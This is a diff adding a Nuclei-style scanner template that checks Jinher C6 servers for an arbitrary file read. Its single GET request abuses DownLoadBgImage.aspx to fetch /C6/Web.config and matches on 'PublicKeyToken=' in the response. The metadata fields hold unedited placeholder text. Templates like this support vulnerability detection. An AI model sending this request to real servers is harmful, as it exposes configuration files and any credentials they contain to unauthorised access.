@@ -1,0 +1,20 @@
+id: jinher-DownLoadBgImage-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/Web.config"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PublicKeyToken='
